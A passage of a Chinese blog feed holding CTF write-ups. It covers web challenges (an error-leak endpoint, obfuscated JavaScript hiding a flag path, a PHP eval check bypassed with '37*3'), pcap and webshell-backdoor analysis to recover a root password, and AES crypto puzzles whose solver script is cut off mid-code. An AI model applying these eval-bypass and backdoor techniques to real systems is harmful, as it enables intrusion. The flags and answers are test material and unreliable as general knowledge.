    <content type="html"><![CDATA[<p>本次比赛的完整wp和题目附件已上传至微信公众：Hor1zon，关注公众号即可获取</p><p>传送门：<a href="https://mp.weixin.qq.com/s?__biz=Mzk0MzQyMTg4Ng==&amp;mid=2247484384&amp;idx=1&amp;sn=75c04b0a829fb9eb600633a8a4d88fb2&amp;chksm=c3356331f442ea275d26fcb3e7029667c4fe39b4259e853cbcc4e494670e304d6cc47ebf9024#rd">https://mp.weixin.qq.com/s?__biz=Mzk0MzQyMTg4Ng==&amp;mid=2247484384&amp;idx=1&amp;sn=75c04b0a829fb9eb600633a8a4d88fb2&amp;chksm=c3356331f442ea275d26fcb3e7029667c4fe39b4259e853cbcc4e494670e304d6cc47ebf9024#rd</a></p><h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h3 id="Improper-Error-Handling"><a href="#Improper-Error-Handling" class="headerlink" title="Improper Error Handling"></a>Improper Error Handling</h3><p><img src="/mdimg/bbctf/1.png"><br>打开靶机是这样的<br><img src="/mdimg/bbctf/2.png"><br>先看源代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs c">&lt;html&gt;<br>  &lt;head&gt;<br>    &lt;title&gt;Top Secret Project&lt;/title&gt;<br>    &lt;style&gt;<br>      body &#123;<br>        font-family: Arial, sans-serif;<br>        margin: <span class="hljs-number">40</span>px;<br>      &#125;<br>      form &#123;<br>        display: flex;<br>        flex-direction: column;<br>        align-items: center;<br>      &#125;<br>      label &#123;<br>        font-size: <span class="hljs-number">1.2</span>em;<br>        margin-bottom: <span class="hljs-number">10</span>px;<br>      &#125;<br>      input[type=<span class="hljs-string">&quot;password&quot;</span>] &#123;<br>        font-size: <span class="hljs-number">1.2</span>em;<br>        padding: <span class="hljs-number">5</span>px;<br>        width: <span class="hljs-number">400</span>px;<br>        margin-bottom: <span class="hljs-number">20</span>px;<br>      &#125;<br>      button &#123;<br>        font-size: <span class="hljs-number">1.2</span>em;<br>        padding: <span class="hljs-number">5</span>px <span class="hljs-number">10</span>px;<br>        background-color: #<span class="hljs-number">4</span>CAF50;<br>        color: white;<br>        border-radius: <span class="hljs-number">5</span>px;<br>        cursor: pointer;<br>      &#125;<br>      pre &#123;<br>        background-color: <span class="hljs-meta">#eee;</span><br>        padding: <span class="hljs-number">20</span>px;<br>        white-space: pre-wrap;<br>        margin-top: <span class="hljs-number">20</span>px;<br>        display: none;<br>      &#125;<br>      .error &#123;<br>        color: red;<br>      &#125;<br>    &lt;/style&gt;<br>  &lt;/head&gt;<br>  &lt;body&gt;<br>    &lt;h1&gt;Top Secret Project&lt;/h1&gt;<br>    &lt;form&gt;<br>      &lt;label <span class="hljs-keyword">for</span>=<span class="hljs-string">&quot;input&quot;</span>&gt;Enter the password:&lt;/label&gt;<br>      &lt;input type=<span class="hljs-string">&quot;password&quot;</span> id=<span class="hljs-string">&quot;input&quot;</span>&gt;<br>      &lt;button type=<span class="hljs-string">&quot;button&quot;</span> onclick=<span class="hljs-string">&quot;sendRequest()&quot;</span>&gt;Submit&lt;/button&gt;<br>    &lt;/form&gt;<br>    &lt;p class=<span class="hljs-string">&quot;error&quot;</span> id=<span class="hljs-string">&quot;error-message&quot;</span>&gt;&lt;/p&gt;<br>    &lt;pre id=<span class="hljs-string">&quot;debug-message&quot;</span>&gt;&lt;/pre&gt;<br>  &lt;/body&gt;<br>  &lt;script&gt;<br>    function sendRequest() &#123;<br>      let length = document.getElementById(<span class="hljs-string">&quot;input&quot;</span>).value;<br>      fetch(<span class="hljs-string">&quot;/api/error?length=&quot;</span> + length)<br>        .then(response =&gt; response.text())<br>        .then(text =&gt; &#123;<br>          <span class="hljs-keyword">if</span> (text.startsWith(<span class="hljs-string">&quot;Error&quot;</span>)) &#123;<br>            document.getElementById(<span class="hljs-string">&quot;error-message&quot;</span>).textContent = text;<br>            document.getElementById(<span class="hljs-string">&quot;error-message&quot;</span>).style.display = <span class="hljs-string">&quot;block&quot;</span>;<br>            document.getElementById(<span class="hljs-string">&quot;debug-message&quot;</span>).style.display = <span class="hljs-string">&quot;none&quot;</span>;<br>          &#125; <span class="hljs-keyword">else</span> &#123;<br>            document.getElementById(<span class="hljs-string">&quot;debug-message&quot;</span>).textContent = text;<br>            document.getElementById(<span class="hljs-string">&quot;debug-message&quot;</span>).style.display = <span class="hljs-string">&quot;block&quot;</span>;<br>            document.getElementById(<span class="hljs-string">&quot;error-message&quot;</span>).style.display = <span class="hljs-string">&quot;none&quot;</span>;<br>          &#125;<br>        &#125;);<br>    &#125;<br>  &lt;/script&gt;<br>  <br>&lt;/html&gt; <br></code></pre></td></tr></table></figure><p>定义了一个sendRequest()请求函数<br>访问：<br><code>/api/error?length=</code><br><img src="/mdimg/bbctf/3.png"><br>试试传参<br><img src="/mdimg/bbctf/4.png"><br>一步一步加长看看<br>当传任意参数到32位时，爆出了flag<br><img src="/mdimg/bbctf/5.png"></p><h3 id="Hi-Score"><a href="#Hi-Score" class="headerlink" title="Hi-Score"></a>Hi-Score</h3><p><img src="/mdimg/bbctf/6.png"><br>一秒点一百下就能拿flag<br>这种题，大概率跟js有关<br>先看看js<br><img src="/mdimg/bbctf/7.png"><br>调试器打开，找到一个函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs c">function _0x59a2() &#123;<br>var _0x78411b = [<br><span class="hljs-string">&quot;\x20cps&quot;</span>,<br><span class="hljs-string">&quot;clicks&quot;</span>,<br><span class="hljs-string">&quot;\x20Your\x20Reward\x20:\x20&lt;a\x20href=\x22&quot;</span> +<br><span class="hljs-string">&quot;2f2e736563726574696f6e2f666c6167&quot;</span><br>.match(/[\da-f]&#123;<span class="hljs-number">2</span>&#125;/gi)<br>.<span class="hljs-built_in">map</span>((h) =&gt; String.fromCharCode(parseInt(h, <span class="hljs-number">16</span>)))<br>.join(<span class="hljs-string">&quot;&quot;</span>) +<br><span class="hljs-string">&quot;\x22\x20download=\x22flag\x22&gt;Reward&lt;/a&gt;&quot;</span>,<br><span class="hljs-string">&quot;3526ccMajJ&quot;</span>,<br><span class="hljs-string">&quot;innerHTML&quot;</span>,<br><span class="hljs-string">&quot;4263236HVNRoh&quot;</span>,<br><span class="hljs-string">&quot;3656895VkgrIX&quot;</span>,<br><span class="hljs-string">&quot;503210VEeXpc&quot;</span>,<br><span class="hljs-string">&quot;toFixed&quot;</span>,<br><span class="hljs-string">&quot;5NfzyuJ&quot;</span>,<br><span class="hljs-string">&quot;8399912tBbEFu&quot;</span>,<br><span class="hljs-string">&quot;SCORE:\x20&quot;</span>,<br><span class="hljs-string">&quot;6379703kdfIqT&quot;</span>,<br><span class="hljs-string">&quot;getElementById&quot;</span>,<br><span class="hljs-string">&quot;getTime&quot;</span>,<br><span class="hljs-string">&quot;48bKPhCj&quot;</span>,<br><span class="hljs-string">&quot;14Xmxuhh&quot;</span>,<br><span class="hljs-string">&quot;reward&quot;</span>,<br><span class="hljs-string">&quot;9wOTYQU&quot;</span>,<br><span class="hljs-string">&quot;597OMUzhx&quot;</span>,<br><span class="hljs-string">&quot;2046510XnQiaG&quot;</span>,<br>];<br>_0x59a2 = function () &#123;<br><span class="hljs-keyword">return</span> _0x78411b;<br>&#125;;<br><span class="hljs-keyword">return</span> _0x59a2();<br>&#125;<br> <br></code></pre></td></tr></table></figure><p>看起来”\x20Your\x20Reward\x20:\x20&lt;a\x20href=\x22” +<br>            “2f2e736563726574696f6e2f666c6167”<br>这段是回显rewaard也就是flag的<br>一开始以为要解这个 2f2e736563726574696f6e2f666c6167<br>发现不行</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">_0x59a2 = function () &#123;<br><span class="hljs-keyword">return</span> _0x78411b;<br>&#125;;<br><span class="hljs-keyword">return</span> _0x59a2();<br>&#125;<br></code></pre></td></tr></table></figure><p>看到这，可以运行_0x59a2()这个函数<br><img src="/mdimg/bbctf/8.png"><br>得到flag的地址<code>/.secretion/flag</code><br>访问下载打开<br><img src="/mdimg/bbctf/9.png"></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>比赛Write Up</category>
      
    </categories>
    
    
    <tags>
      
      <tag>比赛Write Up</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2022年春秋杯网络安全联赛 冬季赛-wp</title>
    <link href="/2023/02/09/2022%E5%B9%B4%E6%98%A5%E7%A7%8B%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%81%94%E8%B5%9B%20%E5%86%AC%E5%AD%A3%E8%B5%9B-wp/"/>
    <url>/2023/02/09/2022%E5%B9%B4%E6%98%A5%E7%A7%8B%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%81%94%E8%B5%9B%20%E5%86%AC%E5%AD%A3%E8%B5%9B-wp/</url>
    
    <content type="html"><![CDATA[<h2 id="misc—nan’s-analysis"><a href="#misc—nan’s-analysis" class="headerlink" title="misc—nan’s analysis"></a>misc—nan’s analysis</h2><p><img src="/mdimg/%E6%98%A5%E7%A7%8B%E6%9D%AF/1.png"><br><strong>一眼丁真要流量分析找root密码</strong><br><strong>wireshark打开流量包，检索password找到一个包</strong><br><img src="/mdimg/%E6%98%A5%E7%A7%8B%E6%9D%AF/2.png"></p><blockquote><p>keyisChunqiuGame00504</p></blockquote><p>翻找流量包发现有shell.php文件，可能有后门<br>然后在终端读这个文件<br><img src="/mdimg/%E6%98%A5%E7%A7%8B%E6%9D%AF/3.png"><br>应该是零宽隐写，用下面这个网站解<br><a href="https://yuanfux.github.io/zero-width-web/">https://yuanfux.github.io/zero-width-web/</a><br><img src="/mdimg/%E6%98%A5%E7%A7%8B%E6%9D%AF/4.png"><br>:::success<br>压缩密码格式’abac’*4，abac为纯数字形如1213，此密码与root密码有关<br>前面找到一个密码ChunqiuGame00504<br>猜测可能是0504 *4<br> 0504050405040504<br>:::<br><img src="/mdimg/%E6%98%A5%E7%A7%8B%E6%9D%AF/5.png"><br>找到一个文件上传的的地方，打开康康<br><img src="/mdimg/%E6%98%A5%E7%A7%8B%E6%9D%AF/6.png"><br>他把上传的后门给加密了，eval的时候会执行解密，直接改成echo把结果打印出来<br><img src="/mdimg/%E6%98%A5%E7%A7%8B%E6%9D%AF/7.png"><br>再跑一遍<br><img src="/mdimg/%E6%98%A5%E7%A7%8B%E6%9D%AF/8.png"><br>:::success<br>/8MARVmEAnfKntdp2/HP0w==<br>这个就是加密的root密码的密文<br>:::<br><img src="/mdimg/%E6%98%A5%E7%A7%8B%E6%9D%AF/9.png"><br>上号，拿flag<br><img src="/mdimg/%E6%98%A5%E7%A7%8B%E6%9D%AF/10.png"></p><h2 id="web—-ezphp"><a href="#web—-ezphp" class="headerlink" title="web— ezphp"></a>web— ezphp</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$num </span>= <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_string</span>(<span class="hljs-variable">$num</span>) &amp;&amp; <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$num</span>) &lt; <span class="hljs-number">5</span> &amp;&amp; <span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$num</span>,<span class="hljs-string">&#x27;111&#x27;</span>) === <span class="hljs-literal">false</span> &amp;&amp; <span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$num</span>,<span class="hljs-string">&#x27;0&#x27;</span>) === <span class="hljs-literal">false</span> &amp;&amp; <span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;return 111===$&#123;num&#125;;&quot;</span>))&#123;<br>    <span class="hljs-title function_ invoke__">readfile</span>(<span class="hljs-string">&#x27;/flag&#x27;</span>);<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>参考：(<a href="https://www.cnblogs.com/chengd/p/7803664.html">https://www.cnblogs.com/chengd/p/7803664.html</a>)<br>:::tips<br>is_string($num)   //检查参数num是否为字符串<br>:::<br>:::info<br> strlen($num) &lt; 5   //参数num的长度要小于5<br>:::</p><blockquote><p> strpos($num,’111’) === false &amp;&amp; strpos($num,’0’) === false   //字符串里面不能含有111和0</p></blockquote><blockquote><p> eval(“return 111===${num};”)    //eval执行，要求(“return 111===${num};”)的返回值为true</p></blockquote><p> 满足以上条件就读取flag<br>关键在于 “return 111===${num};”    //${num}=$num<br>字符串里不允许有111，又要它等于111<br>一开始想到加减乘除，尝试加减无果，除法好像会超长度<br>用乘法：37x3=111</p><p>?num=37*3</p><p><img src="/mdimg/%E6%98%A5%E7%A7%8B%E6%9D%AF/11.png"></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>比赛Write Up</category>
      
    </categories>
    
    
    <tags>
      
      <tag>比赛Write Up</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>NepnepxCATCTF</title>
    <link href="/2023/02/09/NepnepxCATCTF/"/>
    <url>/2023/02/09/NepnepxCATCTF/</url>
    
    <content type="html"><![CDATA[<p><img src="/mdimg/NepnepxCATCTF/CATCTF.png"></p><p><a name="ceHvQ"></a></p><h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><p><a name="rgliv"></a></p><h3 id="ez-js"><a href="#ez-js" class="headerlink" title="ez_js"></a>ez_js</h3><p><img src="/mdimg/NepnepxCATCTF/1.png"><br /><img src="/mdimg/NepnepxCATCTF/2.png"><br><a name="lLkVy"></a></p><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><p><a name="whfyc"></a></p><h3 id="cat’s-gift"><a href="#cat’s-gift" class="headerlink" title="cat’s gift"></a>cat’s gift</h3><p><img src="/mdimg/NepnepxCATCTF/3.png"><br>:::tips<br><strong>1 - 1/3 + 1/5 - 1/7 + …  是求Π/4 近似值的c语言算法     分成4份，所以是派(pie)</strong><br>:::<br> CatCTF{pie}<br><a name="cXq7p"></a></p><h3 id="盖茨比"><a href="#盖茨比" class="headerlink" title="盖茨比"></a>盖茨比</h3><p><img src="/mdimg/NepnepxCATCTF/4.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><span class="hljs-keyword">from</span> Crypto.Util.strxor <span class="hljs-keyword">import</span> strxor <span class="hljs-keyword">as</span> xor<br><span class="hljs-keyword">from</span> Crypto.Util.Padding <span class="hljs-keyword">import</span> pad<br><span class="hljs-keyword">from</span> random <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> base64 <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> copy <span class="hljs-keyword">import</span> copy<br><span class="hljs-keyword">from</span> secret <span class="hljs-keyword">import</span> data<br><br>iv=<span class="hljs-built_in">bytes</span>([randint(<span class="hljs-number">0</span>,<span class="hljs-number">2</span>**<span class="hljs-number">8</span>-<span class="hljs-number">1</span>) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>)]) <br>iva=copy(iv)<br>key=<span class="hljs-built_in">bytes</span>([randint(<span class="hljs-number">0</span>,<span class="hljs-number">2</span>**<span class="hljs-number">8</span>-<span class="hljs-number">1</span>) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>)])<br>cipher=AES.new(key,mode=AES.MODE_ECB)<br>data=pad(data,<span class="hljs-number">16</span>)<br>c=<span class="hljs-string">b&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(data),<span class="hljs-number">16</span>):<br>    s=data[i:i+<span class="hljs-number">16</span>].ljust(<span class="hljs-number">16</span>,<span class="hljs-string">b&quot;\n&quot;</span>)<br>    c+=cipher.encrypt(xor(s,iv))<br>    iv=xor(s,c[-<span class="hljs-number">16</span>:])<br><br><br>key=b64encode(key)<br>c=b64encode(c)<br><br><span class="hljs-built_in">print</span>(key)<br><span class="hljs-built_in">print</span>(c)<br><br><br><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">b&#x27;+0zkhmid1PFjVdxSP09zSw==&#x27;</span><br><span class="hljs-string">b&#x27;A0bzFxdM95YoXm64g0gZkiTloPsBAq7iV56t1M7Q4zVNxRJSTdZH0lzOMa7QyIQbKN/ftm01iZgQAk+JVgCB6hlCdMPWkdpKYHix8BTq/ClEHUPwMEjUEvgKD4tH3T/thoccBw1jfJ9RjhXbMFByWn5cyA/gHVvEEJRpII/ryKMQkzelioQ5b0MfhSy4INLqQk6yAgLzihip5ho7lDJCbYcaz85bDksOo5n9kjOfjFnjUn9G7jX+AtyhygPlGfrvauTeuPdVxqrJTVHvrzUNAqiqtCElX+BWpicP2mkZLt5B/gpquTv8U+StrdTOcr7UkWuz+YdhXkTJYUZguv7EbEnRy+M64QzqfnNf8Zk0tJQ5xOumbY8hxGTuZ8w3rWxjPKLhdgTGLgMcMYF3hPb2eqG9VZKC3T9zElI5MWPyIdkmqkrLEt6vGT8AxWJy1hl2ApkGhrJFB0DobJircN6kXUXvZXitjXSH+BA48muaRlAwK13re+zIcbI+B7+Tm3LuRT9j5NWD9RBoy+IeAQvR05IKWqEpqXEScmZsQxpAFZCSnbchYaYNAuHvBwMcMW7vTMyxROHRtyZ+gWNUhpd8CcZ9FA6w+cwQLMWW5D4nUCMK+NEsSyTBBm/jTiAp/waq+2dTVyBhbQtmm9pBtZtHJtfeVRKuZRXduNnlWDa7Wlwv0Jk2EIJpAaXxosuZnO0PHW3oX+WO5F9ydIfIJAFUpBrn4fMx3c7IJ08+bKwAfBw/johSs1ieyX/YjOOL1KbE9J6Hz3ZBBR4waQ4p9sdLsJ9UFnNghH0ZuB2F7bGoH7SurvaMglo3FyQAfM+n/EVCGWnax/JGEcw5YZuS2c7y5Gd4oOCmpFO/lVj0IaOlZsFsMgQ3GUsBT2h1yh4yarlYUczvGNyOyfUXfueCDBQJNJ7adbdra/DHpV3LXieADKED2HankT+9ACs8oVYPpZhji0UuCdvs1txytsCqPSf5l7JLDkrGP3/7Ob7UcCA4h/B+6/0xg7h+ZJ6ZR41sDpOR8S4pmPlfJkU/np52QZfplY0sKpKlaYhuhUmMSle2TAcvNUGHobNTReFV/MOfX5/HX6behFAeOwHGI14AvUbDmrmkVvbyU88DzBW2YQ/tTTiSLg/wgggkkhLd17NZAMB3XbKuw3WdkdyJfTTpyiN05DqMwV3q64fpzasFXFNQ7ix8Q/APov/TmBYtgFw4ys2jKC6Yws166RXRkrQXzY4Ey9Xvjp5i5nUgW2HLHRGz2B5lg0jI9oWjj5+89Y0Tcqb81OFD5SfeqTbg7Y2WoW6YjQ/Hzvt1l0+p/lFrnOy3ORfhwl+DFBZi4P9i+Hh7/uC1kCW8Lil2M9oVaAH4YB2yhm61AqEk4NPhSeTuioaFfvUY5lD75QiM6BdDFMTlNkC7crXmuiUpztHTzIS6E1kVARI8xsGeljjmJmuKIfQPPQfvSnnAjGeaxCNmRPDMgFGltFiGy63Pv/tVRWbUWiB27APHPsqM2qcV/nM8IwDx5xmwExl/atQXGzn/LL4xyqzmyzD+2qMeZqfzcKZWOjoWIX+SycPvc62HAQmsKqZK5ZO2JKq5OeuFEovG9oOcRYve1XStbTQYiocEbQ4XX/c6xE0cm9P/I5NM1Mlr6CT6qt3Pqb/m+7s/kwzww59FKOq5R6HmK7SHCQ6gwTQ1ciGWbJF3NLHuOpe08X4xl/l0tJengSfJRJ39Q9WwZbgBlEPf7NYeMlR9zU9QQxvZ+r4LiaJVYrQYSCcDj37Vk9XVRMijBDWDWFbK5sgkDHQYmwGYiwH4hEAqAAXDNj1/f2eRFbIU2GN6Wfj89fEINJjoG/1O/I5Q8S7tHnlWFQNoXJQ2e4r2Aca9RPLVCWz7Nq96YUKBRN3afW/9FSwWLLvjsBptQmoRj4FwmJzJf7Vj6KCOkm6mdaZ4l6FB4/E2Lk9aopD7Q473leULPM1CydXWme/8WKUqEucDwraXS57+Z+iGRMvQ8MABtZboAVFK2B1mzNL4Ba/bxVE4puy4HwvQI+N1tKmeMf99FfR13IA0y+FWL3eCzXKw8gimaJCW1e3QJJWDorDXRRjExeokMGGHzOd8MrTfNNFGWSPqZRTdGJxW7wOWQi3bHT0WSqP1fBpdU9m+WKHIxy57dL/8JFJJ97R56P76rlToRrM825JcTBEfrK0Nb9Q+2RI83vyTA2UxH9s9cSnWd+e7nacrfXjV7EjkGHgblEGHX9LqNETaZpBAL0NG9OAJ0+f+6id4/Ixcee0jx4b8k5xvblujFEdK0q2MRo2uTxSAFMpelt8JY0EZbnF9uT88N4LPms3cNeKBt0KBhx+vshFKMc/b3W7OMCo6m7EyzmcTmMe+Y6CO0x0FF0p6h1bTnJu3MMok1hO27iBSfYusHgKWVmKpgNHjiDfuBYnuBCysa+hHQZW23zxNRqi2OGAy6zCGPOY4E4nyUA6g/jlVOjq6fFv1VHN1tlQlBOCvB9r5B0os1zI2XL/Mlb9eggNuA8nw2igDm+9qkBtLxOXojAGDonAPzBagHXnVd+0kLdUGEoddt45A2fgSSociCx4tVDMd5ag1zR4VxdADAy0lnmW0n8noAT5y60SV7gICvMOphILBRjk365Mu6GNA3C+n8k5YH9sRnS7Z5EVEKdSeYigJs4XNavD50/paKnJcux2l3gzm/1aTUMzLd8tw7vZuUWv1XaYULcez8ieEMeACETyN53+RlcPQefupgszELvwlKz0prl5ydHCPOA7+ZS2zfUZOEmRSBNaIZUCd5euNg+HXMeFa/Qb452+KKEjq7vRthC4hH9gluaYMl/eXboQvvVu4xDhfVW403enI7sxdMR3t2WO1cOaLE8IN5c71W+IqhaRbJ/Prlo/pk/XAtMvimZxIN4y5/oP5vQ/lCt5jM9wAtPKSoQbJxWIYWNrXVfkZUOOwD2tlOmyxMCcKFr8921JHgtWqcYliElNX19hzmYhow+19EV3zhITzsGOX/PP1BHIKz/NJyKcGqx1hlfrDfDVedhJWkQL9sg4clbfguprs3KG5YNbbjclaK9JoEboBY3EGBGHtsWfmIRAREwy1a53y/a/NUDLaQxrMsyV/YnbiyBevGjMVNnqIY5T0YtPLL/s5Wvmq7EU9qoMDIlaosCf616TagcZalGFQumL15q6wx3FxwVB5EAjFa/MKnZNc0CqbFhXgEevp1ZXRnjEAdSK99gyAmwVawWpxIWXZQvQ5w7tIQ+nF8utoG4ab/AdLbZyKCtT8pxjiHifNcCCkLfew8Qq9S2JnrhCUMs9SEiRrLZHiE9JVlwbUJzAQjCM6G4tdeLNEApqDv4eZ7zh2U9K2+Gk9OjBgSk5xMjRkCzKCrNAKgRLoJ1Gu8L4T9LSBp1juhUsyaIaK&#x27;</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br></code></pre></td></tr></table></figure><p>:::tips<br>这段代码实现了对明文数据进行加密，并使用了 AES 加密算法，使用了 ECB 模式。<br />它先生成了一个 16 字节的随机密钥和一个 16 字节的随机初始化向量 (IV)。然后使用这个密钥和 IV 初始化一个 AES 加密器。接着，它对明文数据进行补齐，使其长度是 16 的倍数，并将明文分块。每一块都使用相同的密钥进行加密，但是使用的 IV 是加密的前一块的输出与当前块的异或。<br />最后，将加密的密钥和密文进行 base64 编码，并输出。<br>:::</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><span class="hljs-keyword">from</span> Crypto.Util.strxor <span class="hljs-keyword">import</span> strxor <span class="hljs-keyword">as</span> xor<br><span class="hljs-keyword">from</span> string <span class="hljs-keyword">import</span> printable<br><span class="hljs-keyword">from</span> base64 <span class="hljs-keyword">import</span> b64decode<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment"># 将密钥和密文 base64 解码</span><br>key = b64decode(<span class="hljs-string">b&#x27;+0zkhmid1PFjVdxSP09zSw==&#x27;</span>)<br>ciphertext = b64decode(<span 